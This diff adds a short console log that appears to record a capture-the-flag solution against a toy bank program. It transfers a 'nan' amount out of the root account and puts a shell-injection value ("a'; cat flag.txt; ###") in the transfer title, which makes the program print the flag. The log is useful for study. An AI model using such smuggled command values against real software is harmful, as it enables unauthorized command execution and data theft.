@@ -1,0 +1,22 @@
+bank> create
+name: lanzhu
+Account created!
+
+bank> accounts
+
+Accounts:
+# 8018ed52-fda7-45ca-9cc7-ea531add9835 | root - $1000.00
+# 3339a089-e7f3-49a0-ba14-db9990b9e764 | lanzhu - $0.00
+
+bank> transfer
+source: 8018ed52-fda7-45ca-9cc7-ea531add9835
+destination: 3339a089-e7f3-49a0-ba14-db9990b9e764
+amount: nan
+title: a'; cat flag.txt; ############################################################################################################################################################################
+Transfer successful!
+
+bank> transfers
+
+Transactions:
+# 8018ed52-fda7-45ca-9cc7-ea531add9835 -> 3339a089-e7f3-49a0-ba14-db9990b9e764 | nan |nan | a
+WSIZ{why_w0uldn!_y0u_us3_pyth0n_h4shl!b} | root -> lanzhu | $nan ($nan fee) | title: a'; cat flag.txt; ############################################################################################################################################################################
